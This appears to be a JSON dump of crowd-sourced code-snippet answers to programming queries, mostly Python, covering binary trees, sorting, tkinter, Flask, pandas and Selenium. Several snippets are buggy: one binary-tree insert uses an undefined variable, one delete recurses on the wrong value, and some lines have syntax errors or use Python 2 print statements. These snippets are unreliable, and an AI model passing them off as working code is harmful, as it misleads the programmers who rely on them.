    "description": "gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 363,
    "keyword": null,
    "link": null,
    "title": " bidding program in python",
    "description": "import os logo = '''                          ___________                          \\         /                           )_______(                           ___                              |\"\"\"\"\"\"\"|_.-._,.---------.,_.-._   |   |                           |       | | |               | | ''-|    |                           |       |_| |_             _| |_..-|    |                           |_______| '-' `'---------'` '-'    |___|                           )\"\"\"\"\"\"\"(                          /_________\\\\                                                  .-------------.                       /_______________\\\\ ''' print(logo)  bids = {} bidding_finished = False  def find_highest_bidder(bidding_record):   highest_bid = 0   winner = \"\"   # bidding_record = {\"Angela\": 123, \"James\": 321}   for bidder in bidding_record:     bid_amount = bidding_record[bidder]     if bid_amount > highest_bid:        highest_bid = bid_amount       winner = bidder   print(f\"The winner is {winner} with a bid of ${highest_bid}\")  while not bidding_finished:   name = input(\"What is your name?: \")   price = int(input(\"What is your bid?: $\"))   bids[name] = price   should_continue = input(\"Are there any other bidders? Type 'yes or 'no'.\\n\")   if should_continue == \"no\":     bidding_finished = True     find_highest_bidder(bids)   elif should_continue == \"yes\":     os.system(\"cls\")\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 364,
    "keyword": null,
    "link": null,
    "title": " binäre suche algorithmus python programmieren",
    "description": "## searching function def search_element(sorted_arr, n, element):  \t## array index for iteration \ti = 0  \t## variables to track the search area \t## initializing them with start and end indexes \tstart = 0 \tend = n - 1  \t## iterating over the array \twhile i < n: \t\t## getting the index of the middle element \t\tmiddle = (start + end) // 2  \t\t## checking the middle element with required element \t\tif sorted_arr[middle] == element: \t\t\t## returning True since the element is in the array \t\t\treturn True \t\telif sorted_arr[middle] < element: \t\t\t## moving the start index of the search area to right \t\t\tstart = middle + 1 \t\telse: \t\t\t## moving the end index of the search area to left \t\t\tend = middle - 1 \t\ti += 1 \treturn False   if __name__ == '__main__': \t## initializing the array, length, and element to be searched \tarr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] \tn = 10 \telement_to_be_searched = 9 \t# element_to_be_searched = 11  \tif search_element(arr, n, element_to_be_searched): \t\tprint(element_to_be_searched, \"is found\") \telse: \t\tprint(element_to_be_searched, \"is not found\") \n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 365,
    "keyword": null,
    "link": null,
    "title": " binary number in python 32 bit",
    "description": ">>> '{:032b}'.format(100) '00000000000000000000000001100100' >>> '{:032b}'.format(8589934591) '111111111111111111111111111111111' >>> '{:032b}'.format(8589934591 + 1) '1000000000000000000000000000000000'    # N.B. this is 33 digits long\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 366,
    "keyword": null,
    "link": null,
    "title": " binary operation python",
    "description": "x << y \"left shifted x by y places\" x >> y \"right shift x by y places\" x & y \"bitwise and\" x | y \"bitwise or\". ~ x \"Complement of x\" x ^ y \"bitwise exclusive or\"\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 367,
    "keyword": null,
    "link": null,
    "title": " binary to text python",
    "description": "a_binary_string = \"01100001 01100010 01100011\" ascii_string = \"\".join([chr(int(binary, 2)) for binary in a_binary_string.split(\" \")]) # ascii_string = \"abc\"\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 368,
    "keyword": null,
    "link": null,
    "title": " binary tree python",
    "description": "class Binarytree:     def __init__(self,data):         self.data = data         self.left = None         self.right = None          def addChild(self, data):         if data == self.data:             return                  if data < self.data:             if self.left:                 self.left.addChild(data)             else:                 self.left = Binarytree(data)         else:             if self.right:                 self.right.addChild(data)             else:                 self.right = Binarytree(data)          def inorder(self):         element = [ ]                  if self.left:             element += self.left.inorder()                  element.append(self.data)                  if self.right:             element += self.right.inorder()                  return element          def search(self,val):         if val == self.data:             return True         if val < self.data:             if self.left:                 return self.left.search(val)             else:                 return False         else:             if self.right:                 return self.right.search(val)             else:                 return False  def buildtree(element):     root = Binarytree(element[0])     for i in range(1,len(element)):         root.addChild(element[i])     return root      if __name__ == '__main__':     element = [39, 87, 21, 42, 95, 52, 12]     tree = buildtree(element)     print(tree.inorder())     print(tree.search(38))\nclass BinaryTree:      def __init__(self, value):          self.left = None         self.right = None         self.value = value      def insert(self, value):          if self.value:             if data < self.value:                 if self.left is None:                     self.left = BinaryTree(value)                 else:                     self.left.insert(value)             elif data > self.value:                 if self.right is None:                     self.right = BinaryTree(value)                 else:                     self.right.insert(value)         else:             self.value = value      def PrintTree(self):         if self.left:             self.left.PrintTree()         print( self.data),         if self.right:             self.right.PrintTree()  root = BinaryTree(100) root.insert(50) root.insert(55) root.insert(60) root.insert(20) root.insert(52)   root.PrintTree() PythonCopy\nclass Binary:     def __init__(self, data):         self.data = data         self.left = None         self.right = None          def addChild(self, data):         if data == self.data:             return         if data < self.data:             if self.left:                 self.left.addChild(data)             else:                 self.left = Binary(data)         else:             if self.right:                 self.right.addChild(data)             else:                 self.right = Binary(data)          def inorder(self):         ele = []                  if self.left:             ele += self.left.inorder()         ele.append(self.data)                  if self.right:             ele += self.right.inorder()                  return ele          def search(self, data):         if data == self.data:             return True         if data < self.data:             if self.left:                 return self.left.search(data)             else:                 return False         else:             if self.right:                 return self.right.search(data)             else:                 return False          def find_min(self):         if self.left is None:             return self.data         return self.left.find_min()          def find_max(self):         if self.right is None:             return self.data         return self.right.find_max()          def delete(self, val):         if val < self.data:             if self.left:                 self.left = self.left.delete(val)         elif val > self.data:             if self.right:                 self.right = self.right.delete(val)         else:             if self.left is None and self.right is None:                 return None             if self.left is None:                 return self.right             if self.right is None:                 return self.left                          min_val = self.right.find_min()             self.data = min_val             self.right = self.right.delete(val)                  return self    def build(element):     root = Binary(element[0])     for i in range(1,len(element)):         root.addChild(element[i])     return root  if __name__ == '__main__':     element = [32, 89, 12, 94, 23, 61, 2]     tree = build(element)     print(tree.inorder())     print(tree.search(62))     print(tree.find_min())     print(tree.find_max())     tree.delete(12)     print(tree.inorder())     \n// Binary Tree in Golang package main    import (     \"fmt\"     \"os\"     \"io\" )    type BinaryNode struct {     left  *BinaryNode     right *BinaryNode     data  int64 }    type BinaryTree struct {     root *BinaryNode }    func (t *BinaryTree) insert(data int64) *BinaryTree {     if t.root == nil {         t.root = &BinaryNode{data: data, left: nil, right: nil}     } else {         t.root.insert(data)     }     return t }    func (n *BinaryNode) insert(data int64) {     if n == nil {         return     } else if data <= n.data {         if n.left == nil {             n.left = &BinaryNode{data: data, left: nil, right: nil}         } else {             n.left.insert(data)         }     } else {         if n.right == nil {             n.right = &BinaryNode{data: data, left: nil, right: nil}         } else {             n.right.insert(data)         }     }    }    func print(w io.Writer, node *BinaryNode, ns int, ch rune) {     if node == nil {         return     }        for i := 0; i < ns; i++ {         fmt.Fprint(w, \" \")     }     fmt.Fprintf(w, \"%c:%v\\n\", ch, node.data)     print(w, node.left, ns+2, 'L')     print(w, node.right, ns+2, 'R') }    func main() {     tree := &BinaryTree{}     tree.insert(100).         insert(-20).         insert(-50).         insert(-15).         insert(-60).         insert(50).         insert(60).         insert(55).         insert(85).         insert(15).         insert(5).         insert(-10)     print(os.Stdout, tree.root, 0, 'M') } \n# Create Decision Tree classifer object clf = DecisionTreeClassifier(criterion=\"entropy\", max_depth=3)  # Train Decision Tree Classifer clf = clf.fit(X_train,y_train)  #Predict the response for test dataset y_pred = clf.predict(X_test)  # Model Accuracy, how often is the classifier correct? print(\"Accuracy:\",metrics.accuracy_score(y_test, y_pred)) \nBinary Tree implementation at this link:    https://github.com/shreyasvedpathak/Data-Structure-Python/tree/master/BinaryTrees\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 369,
    "keyword": null,
    "link": null,
    "title": " bind keyboard enter key to a function using tkinter",
    "description": " pythonCopyimport tkinter as tk  app = tk.Tk() app.geometry(\"200x100\")  def callback(event):     label[\"text\"] = \"You pressed Enter\"  app.bind('<Return>', callback)  label = tk.Label(app, text=\"\") label.pack()  app.mainloop()\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 370,
    "keyword": null,
    "link": null,
    "title": " binomial coefficient python",
    "description": "def binomialCoef(n, k):      C = [0 for x in range(k+1)]     C[0] = 1     for i in range(n+1):          for j in range(min(i, k),0,-1):             C[j] = C[j] + C[j-1]     return C[k]\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 371,
    "keyword": null,
    "link": null,
    "title": " blackjack in python",
    "description": "# GO TO https://www.askpython.com/python/examples/blackjack-game-using-python # THERES A TUTORIAL THERE WITH ALL THE NEEDED CODE\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 372,
    "keyword": null,
    "link": null,
    "title": " blank dataframe with column names",
    "description": "df = pd.DataFrame(columns = column_names)\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 373,
    "keyword": null,
    "link": null,
    "title": " blinking an led with raspberry pi",
    "description": "import RPi.GPIO as GPIO # IMPORTANT: remember to change the gpio pin (18) also it needs to be programmed in Thonny Python IDE import time #used in raspberry pi model 4  GPIO.setwarnings(False) #NOTE: raspberry pi could be updated, and you might need to change your code GPIO.setmode(GPIO.BCM)  GPIO.setup(18, GPIO.OUT)   while True:       GPIO.output(18, True)        time.sleep(1)        GPIO.output(18, False)        time.sleep(1) \n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 374,
    "keyword": null,
    "link": null,
    "title": " block window if another window is open tkinter",
    "description": "b.grab_set() # when you show the popup # do stuff ... b.grab_release() # to return to normal \nYou can also do this with an if statement:      if wind1 is not None and win1.winfo_exists():         pass      else:         wind1 = tk.Tk()         wind1.title('Window 1')          w1button1 = ttk.Button(wind1,text='Launch Window 2', command=startwind2)         w1button1.pack()          w1button2 = ttk.Button(wind1,text='Check if Window 2 exists',command=checkwind2)         w1button2.pack()          wind1.mainloop()\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 375,
    "keyword": null,
    "link": null,
    "title": " bold text variable in python",
    "description": "bolded_string = \"\\033[1m\" + a_string + \"\\033[0m\"\n",
    "reg_date": "2021-10-12T11:28:06.000Z"
  },
  {
    "id": 376,
    "keyword": null,
    "link": null,
    "title": " bootstrap Navbar active in django",
    "description": "# navbar_demo/pages/views.py...   '''We will pass a unique variable for each page whose value will be 'active' to make  a page active in navbar when it call.'''  def index(request):       context = {\"home_page\": \"active\"} # new info here       return render(request, 'pages/index.html', context)  def about(request):       context = {\"about_page\": \"active\"} # new info here       return render(request, 'pages/about.html', context)  def contact(request):       context = {\"contact_page\": \"active\"} # new info here       return render(request, 'pages/contact.html', context)  # In html file #   '''   <ul class=\"navbar-nav\">   <li class=\"nav-item {{ home_page }}\">       <a class=\"nav-link\" href=\"{% url 'index' %}\">Home</a>    </li>    <li class=\"nav-item {{ about_page }}\">       <a class=\"nav-link\" href=\"{% url 'about' %}\">About</a>     </li>    <li class=\"nav-item {{ contact_page }}\">        <a class=\"nav-link\" href=\"{% url 'contact' %}\">Contact</a>     </li>  </ul> '''\n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 377,
    "keyword": null,
    "link": null,
    "title": " brew install python 3.7",
    "description": "brew install python@3.7\n$ brew update && brew upgrade python \nbrew install python3 brew install python2\n$ brew switch python 3.6.5_1 \nexport PATH=\"/usr/local/opt/python/libexec/bin:$PATH\" \n$ brew install --ignore-dependencies https://raw.githubusercontent.com/Homebrew/homebrew-core/f2a764ef944b1080be64bd88dca9a1d80130c558/Formula/python.rb \n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 378,
    "keyword": null,
    "link": null,
    "title": " browse list python",
    "description": "for elt in lst[::-1]:     print(elt)\n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 379,
    "keyword": null,
    "link": null,
    "title": " browser pop up yes no selenium python",
    "description": "from selenium import webdriver from selenium.webdriver.common.alert import Alert  driver = webdriver.Firefox() # it is your webdriver variable alert = Alert(driver) alert.accept()\n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 380,
    "keyword": null,
    "link": null,
    "title": " browser refresh selenium python",
    "description": "driver.refresh()\nbrowser.refresh()\n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 381,
    "keyword": null,
    "link": null,
    "title": " bubble sort in python",
    "description": "def bubbleSort(lis):     length = len(lis)     for i in range(length):         for j in range(length - i):             a = lis[j]             if a != lis[-1]:                 b = lis[j + 1]                 if a > b:                     lis[j] = b                     lis[j + 1] = a     return lis\ndef bubble_sort(arr):     x=-1     n=len(arr)#length of array 6     for i in range (0,n):         for j in range(1,n-i):             if arr[j-1]>arr[j]:                 arr[j-1],arr[j]=arr[j],arr[j-1]         if (n-i)<=1:             break     return arr              if \"__main__\"==__name__:     arr=[7,1,2,6,9,3,8,4]     result=bubble_sort(arr)     print(result)                 \ndef bubbleSort(arr):      n = len(arr)         # Traverse through all array elements      for i in range(n-1):      # range(n) also work but outer loop will repeat one time more than needed.             # Last i elements are already in place          for j in range(0, n-i-1):                 # traverse the array from 0 to n-i-1              # Swap if the element found is greater              # than the next element              if arr[j] > arr[j+1] :                  arr[j], arr[j+1] = arr[j+1], arr[j]     # Driver code to test above  arr = [64, 34, 25, 12, 22, 11, 90]     bubbleSort(arr)\ndef bubble_sort(arr):     def swap(i, j):         arr[i], arr[j] = arr[j], arr[i]      n = len(arr)     swapped = True          x = -1     while swapped:         swapped = False         x = x + 1         for i in range(1, n-x):             if arr[i - 1] > arr[i]:                 swap(i - 1, i)                 swapped = True                          return arr\ndef bubble(st):     for i in range(len(st),1,-1):         for j in range(0,i-1):             if st[j]>st[j+1]:                 st[j],st[j+1]=st[j+1],st[j]             else:                 pass     print(st) bubble([64, 34, 25, 12, 22, 11, 90] )\ndef bubbleSort(lis):     length = len(lis)     for i in range(length):         for j in range(length - i):             a = lis[j]             if a != lis[-1]:                 b = lis[j + 1]                 if a > b:                     lis[j] = b                     lis[j + 1] = a     return lis \n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 382,
    "keyword": null,
    "link": null,
    "title": " build spacy custom ner model stackoverflow",
    "description": "def main(model=None, output_dir=r'model', n_iter=100):     \"\"\"Load the model, set up the pipeline and train the entity recognizer.\"\"\"     if model is not None:         nlp = spacy.load(model)  # load existing spaCy model         print(\"Loaded model '%s'\" % model)     else:         nlp = spacy.blank(\"en\")  # create blank Language class         print(\"Created blank 'en' model\")      # create the built-in pipeline components and add them to the pipeline     # nlp.create_pipe works for built-ins that are registered with spaCy     if \"ner\" not in nlp.pipe_names:         ner = nlp.create_pipe(\"ner\")         nlp.add_pipe(ner, last=True)     # otherwise, get it so we can add labels     else:         ner = nlp.get_pipe(\"ner\")      # add labels     for _, annotations in TRAIN_DATA:         for ent in annotations.get(\"entities\"):             ner.add_label(ent[2])      # get names of other pipes to disable them during training     other_pipes = [pipe for pipe in nlp.pipe_names if pipe != \"ner\"]     with nlp.disable_pipes(*other_pipes):  # only train NER         # reset and initialize the weights randomly &ndash; but only if we're         # training a new model         if model is None:             nlp.begin_training()         for itn in range(n_iter):             random.shuffle(TRAIN_DATA)             losses = {}             # batch up the examples using spaCy's minibatch             batches = minibatch(TRAIN_DATA, size=compounding(4.0, 32.0, 1.001))             for batch in batches:                 texts, annotations = zip(*batch)                 nlp.update(                     texts,  # batch of texts                     annotations,  # batch of annotations                     drop=0.5,  # dropout - make it harder to memorise data                     losses=losses,                 )             print(\"Losses\", losses)      # test the trained model     for text, _ in TRAIN_DATA:         doc = nlp(text)         print(\"Entities\", [(ent.text, ent.label_) for ent in doc.ents])         print(\"Tokens\", [(t.text, t.ent_type_, t.ent_iob) for t in doc])      # save model to output directory     if output_dir is not None:         output_dir = Path(output_dir)         if not output_dir.exists():             output_dir.mkdir()         nlp.to_disk(output_dir)         print(\"Saved model to\", output_dir) \n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 383,
    "keyword": null,
    "link": null,
    "title": " builtwith python",
    "description": "#!/usr/bin/python3 # pip install builtwith import builtwith host = input(\"\\nEnter Host: \") c = builtwith.parse(host) print(c)\npip install builtwith \n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 384,
    "keyword": null,
    "link": null,
    "title": " button in flask",
    "description": "<input type=\"submit\" name=\"submit_button\" value=\"Do Something\"> <input type=\"submit\" name=\"submit_button\" value=\"Do Something Else\"> def contact():     if request.method == 'POST':         if request.form['submit_button'] == 'Do Something':             pass # do something         elif request.form['submit_button'] == 'Do Something Else':             pass # do something else         else:             pass # unknown     elif request.method == 'GET':         return render_template('contact.html', form=form)\n <form method =\"post\" action=\"/\">   <button type=\"submit\" name=\"submit_a\" value=\"submit_a\"> Submit_a </button>   <button type=\"submit\" name=\"submit_b\" value=\"submit_b\"> Submit_b </button> </form>     def submit():  \tif request.method == \"POST\": \t\tif request.form.get(\"submit_a\"): \t\t\t# do something \t\telif request.form.get(\"submit_b\"): \t\t\t# do something else \telif request.method == \"GET\": \t\t\t# do something \t\t \n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 385,
    "keyword": null,
    "link": null,
    "title": " button tkinter image",
    "description": "import tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path\\\\to\\\\imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\n",
    "reg_date": "2021-10-12T11:28:07.000Z"
  },
  {
    "id": 386,
    "keyword": null,
    "link": null,
    "title": " bytes-like object",
    "description": "#Convert string into byte-like object newstr = \"Hello World\" newstr_bytes = newstr.encode(\"ascii\") print(newstr_bytes)\n#Encoding and Decoding of Base64 step-by-step # a string that we will convert to bytes str_string = \"Educative\"  # convert the string to using bytes with ascii encoding # parameters of function bytes  # 1. The string that needs to be converted # 2. The specified encoding e.g ascii, uft-8 etc. str_bytes = str_string.encode(\"ascii\")  # Will print the string but as bytes print(\"encdoed =    \", str_bytes)  # The type will represent a byte object print(type(str_bytes))  # represents the ascii encodings of each character in converted string print(list(str_bytes))  list_bytes = list(str_bytes)  for b in list_bytes:   print(chr(b), \"is represented by\",b)  # decoding the string str_decode = str_bytes.decode(\"ascii\") print(\"decoded =    \", str_decode)\n'Hello World'.encode() \n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 387,
    "keyword": null,
    "link": null,
    "title": " bytes to string python",
    "description": "# utf-8 is used here because it is a very common encoding, but you # need to use the encoding your data is actually in. bytes = b'abcde' bytes.decode(\"utf-8\")  'abcde'\ndata = \"\"  \t\t\t#string data = \"\".encode()\t#bytes data = b\"\" \t\t\t#bytes data = b\"\".decode() #string data = str(b\"\")  \t#string\nIt is a common misconception that text is ascii or utf8 or cp1252, and therefore bytes are text. Text is only text, in the way that images are only images.  The matter of storing text or images to disk is a matter of encoding that data into a sequence of bytes.  There are many ways to encode images into bytes: Jpeg, png, svg, and likewise many ways to encode text, ascii, utf8 or cp1252. Once encoding has happened, bytes are just bytes.  Bytes are not images anymore,they have forgotten the colors they mean;  although an image format decoder can recover that information. Bytes have similarly forgotten the letters they used to be.  In fact, bytes don't remember wether they were images or text at all. Only out of band knowledge  (filename, media headers, etcetera) can guess what those bytes should mean, and even that can be wrong (in case of data corruption) so, in python (py3), we have two types for things that might otherwise look similar;  For text, we have str, which knows it's text; it knows which letters it's supposed to mean.  It doesn't know which bytes that might be, since letters are not bytes.  We also have bytestring, which doesn't know if it's text or images or any other kind of data. The two types are superficially similar, since they are both sequences of things, but the things that they are sequences of is quite different. Implementationally, str is stored in memory as UCS-? where the ? is implementation defined,  it may be UCS4, UCS2 or UCS1, depending on compile time options and which codepoints are present in the represented string.\nbytesliteral   ::=  bytesprefix(shortbytes | longbytes) bytesprefix    ::=  \"b\" | \"B\" | \"br\" | \"Br\" | \"bR\" | \"BR\" shortbytes     ::=  \"'\" shortbytesitem* \"'\" | '\"' shortbytesitem* '\"' longbytes      ::=  \"'''\" longbytesitem* \"'''\" | '\"\"\"' longbytesitem* '\"\"\"' shortbytesitem ::=  shortbyteschar | bytesescapeseq longbytesitem  ::=  longbyteschar | bytesescapeseq shortbyteschar ::=  <any ASCII character except \"\\\" or newline or the quote> longbyteschar  ::=  <any ASCII character except \"\\\"> bytesescapeseq ::=  \"\\\" <any ASCII character> \n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 388,
    "keyword": null,
    "link": null,
    "title": " calculate highest frequency or mode in pandas dataframe",
    "description": "#Calculating mode of a column df['column_name'].mode()  #NB: This will show the index and value. To show only the value: df['column_name'].mode()[0]  #Calculating mode of an entire dataframe or more than one series df.mode()  #These arguments can be parsed: df.mode(axis=0, numeric_only=False, dropna=True) axis # axis=0 for rows and axis=1 for columns numeric_only # False considers all values and; =True ignores all non-numerics. dropna # =False considers all NaN values and; =True ignores all NaN values.\n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 389,
    "keyword": null,
    "link": null,
    "title": " calculate market value crsp pandas",
    "description": "CRSP['market_value'] = (CRSP['PRC']/CRSP['CFACPR'])*(CRSP['SHROUT']*CRSP['CFACSHR'])\n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 390,
    "keyword": null,
    "link": null,
    "title": " calculate quartiles python",
    "description": "# credit to the source link  import numpy as np  quant = np.quantile(arr, q)  # arr: array - like object (list or np.array) # q: float from 0 to 1\n>>> np.percentile(df.time_diff, 25)  # Q1 0.48333300000000001  >>> np.percentile(df.time_diff, 50)  # median 0.5  >>> np.percentile(df.time_diff, 75)  # Q3 0.51666699999999999 \n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 391,
    "keyword": null,
    "link": null,
    "title": " calculate root mean square error python",
    "description": "def rmse(predictions, targets):     return np.sqrt(((predictions - targets) ** 2).mean())\n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 392,
    "keyword": null,
    "link": null,
    "title": " calculate the addition of two lists in python",
    "description": "list1 = [1, 2, 3] list2 = [4, 5, 6]  # `zipped_lists` contains pairs of items from both lists. # Create a list with the sum of each pair. sum = [x + y for (x, y) in zip(list1, list2)]   print(sum) # [5, 7, 9]\nlist1 = [\"a\", \"b\" , \"c\"] list2 = [1, 2, 3]  list1.extend(list2) print(list1) \n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 393,
    "keyword": null,
    "link": null,
    "title": " callbacks tensorflow 2.0",
    "description": "import tensorflow as tf  class myCallback(tf.keras.callbacks.Callback):   def on_epoch_end(self, epoch, logs={}):     if(logs.get('acc')>0.6):       print(\"\\nReached 60% accuracy so cancelling training!\")       self.model.stop_training = True  mnist = tf.keras.datasets.fashion_mnist  (x_train, y_train),(x_test, y_test) = mnist.load_data() x_train, x_test = x_train / 255.0, x_test / 255.0  callbacks = myCallback()  model = tf.keras.models.Sequential([   tf.keras.layers.Flatten(input_shape=(28, 28)),   tf.keras.layers.Dense(512, activation=tf.nn.relu),   tf.keras.layers.Dense(10, activation=tf.nn.softmax) ]) model.compile(optimizer=tf.optimizers.Adam(),               loss='sparse_categorical_crossentropy',               metrics=['accuracy'])  model.fit(x_train, y_train, epochs=10, callbacks=[callbacks])\n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 394,
    "keyword": null,
    "link": null,
    "title": " calss python",
    "description": "class Person:   def __init__(self, name, age):     self.name = name     self.age = age  p1 = Person(\"John\", 36)  print(p1.name) #>> \"John\" print(p1.age) #>> 36\nclass ClassName(object): #\"(object)\" isn't mandatory unless this class inherit from another   \tdef __init__(self, var1=0, var2):          \t#the name of the construct must be \"__init__\" or it won't work     \t#the arguments \"self\" is mandatory but you can add more if you want      \tself.age = var1     \tself.name = var2          \t#the construct will be execute when you declare an instance of this class        \tdef otherFunction(self):     \t         #the other one work like any basic fonction but in every methods,     \t#the first argument (here \"self\") return to the class in which you are  \t\n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 395,
    "keyword": null,
    "link": null,
    "title": " can python function find name of its caller",
    "description": "# YES, here are two methods I have found so far: # These methods work with the version Python 3.5+ # Method 1: https://tinyurl.com/54c8cvcp import inspect  def f(): \tprint(inspect.stack()[1].function)  def g(): \tf()  g() # OUTPUT: g  # Method 2: https://tinyurl.com/up3yg9m2 import sys  getframe_expr = 'sys._getframe({}).f_code.co_name'  def foo():     print \"I am foo, calling bar:\"     bar()  def bar():     print \"I am bar, calling baz:\"     baz()  def baz():     print \"I am baz:\"     caller = eval(getframe_expr.format(2))     callers_caller = eval(getframe_expr.format(3))     print \"I was called from\", caller     print caller, \"was called from\", callers_caller  foo() # OUTPUT: I am foo, calling bar: I am bar, calling baz: I am baz: I was called from bar bar was called from foo  # Method 3: https://tinyurl.com/2p864o7k import inspect  def f1():     f2()  def f2():     curframe = inspect.currentframe()     calframe = inspect.getouterframes(curframe, 2)     print('caller name:', calframe[1][3])  f1() # OUTPUT: caller name: f1 \n",
    "reg_date": "2021-10-12T11:28:08.000Z"
  },
  {
    "id": 396,
    "keyword": null,
    "link": null,
    "title": " can variables have spaces python",
    "description": "No.  Use underscores instead.\n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 397,
    "keyword": null,
    "link": null,
    "title": " can you assign a pid to a process via python",
    "description": "def main():     # Fetch information for current processes:     proc_info_old = get_proc_info()      # Extract list of PIDs:     pids_old = get_all(proc_info_old, \"ProcessId\")        # Do something that starts one or more new processes:     os.system('start notepad.exe')        # Fetch information for current processes:     proc_info_new = get_proc_info()      # Extract list of PIDs:     pids_new = get_pids(proc_info_new, \"ProcessId\")        # Determine PIDs which are only in pids_new, not in pids_old:     new_pids = list(set(pids_new) - set(pids_old))      # Output new PIDs and the associated command line:     for pid in new_pids:         cmd = get_for(proc_info_new, \"ProcessId\", pid, \"CommandLine\")         test.log(\"PID: %s\" % pid)         test.log(\"CMD: %s\" % cmd)         test.log(\"\")      os.system(\"taskkill /f /im notepad.exe\")  def get_all(proc_info, get_name):     res = []     for pi in proc_info:         res.append(pi[get_name])     return res  def get_for(proc_info, look_for_name, look_for_value, get_name):     for pi in proc_info:         if pi[look_for_name] == look_for_value:             return pi[get_name]     return None  def get_proc_info(search_expression=None):     if search_expression is None:         search_expression = \"\"     else:                 search_expression = \" WHERE \" + search_expression      # Execute with wmic and capture output:     s = 'pushd \"' + os.getcwd() + '\" && wmic PROCESS ' + search_expression + ' GET * /format:csv <nul'     d = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0];      # Strip first empty line produced by wmic:     d = d[3:]      # Write to file (to later read via testData API):     fn = \"temp.csv\"     f = codecs.open(fn, \"w\", \"utf8\")     f.write(d)     f.close()      # Read via testData API:     dataset = testData.dataset(fn)     all_proc_info = []     for row in dataset:         proc_info = {}         field_names = testData.fieldNames(row)         for n in field_names:             v = testData.field(row, n)             proc_info[n] = v         all_proc_info.append(proc_info)     os.remove(fn)     return all_proc_info\n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 398,
    "keyword": null,
    "link": null,
    "title": " can you edit string.punctuation",
    "description": ">>> from string import punctuation >>> from re import sub >>>  >>> string = \"\\Fred-Daniels!\" >>> translator = str.maketrans('','', sub('\\-', '', punctuation)) >>> string '\\\\Fred-Daniels!' >>> string = string.translate(translator) >>> string 'Fred-Daniels' \n>>> name = '\\\\test-1.' >>> valid_characters = 'abcdefghijklmnopqrstuvwxyz1234567890- ' >>> filtered_name = ''.join([ x for x in name if x.lower() in valid_characters ]) >>> print(filtered_name) test-1 \n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 399,
    "keyword": null,
    "link": null,
    "title": " can you print to multiple output files python",
    "description": "# Python 3 print('Python', 3, 'Rocks', end=' ') print('I love Python') >>> Python 3 Rocks I love Python\n# Python 3 outputFile1 = open('text.txt', 'w') outputFile2 = open('text2.txt'. 'w')  print('Hello World', file=outputFile1) print('Hello World 2', file=outputFile2)\n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 400,
    "keyword": null,
    "link": null,
    "title": " can you rerun a function in the same function python",
    "description": "phrase = \"hello, world\"  while input(\"Guess the phrase: \") != phrase:     print(\"Incorrect.\")  # Evaluate the input here print(\"Correct\")  # If the user is successful \n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 401,
    "keyword": null,
    "link": null,
    "title": " cannot be loaded as Python module",
    "description": "$ sudo apt-get remove libapache2-mod-python libapache2-mod-wsgi $ sudo apt-get install libapache2-mod-wsgi-py3\n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 402,
    "keyword": null,
    "link": null,
    "title": " cannot import name 'abc' from 'bson.py3compat'",
    "description": "pip uninstall bson pip uninstall pymongo pip install pymongo\n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 403,
    "keyword": null,
    "link": null,
    "title": " cannot import name 'candlestick2 ohlc",
    "description": "    from mplfinance.original_flavor import candlestick_ohlc \n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 404,
    "keyword": null,
    "link": null,
    "title": " cannot import name 'imputer'",
    "description": "from sklearn.impute import SimpleImputer  imputer = SimpleImputer(missing_values=np.nan, strategy='mean') \n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 405,
    "keyword": null,
    "link": null,
    "title": " cannot import name 'imputer' from 'sklearn.preprocessing'",
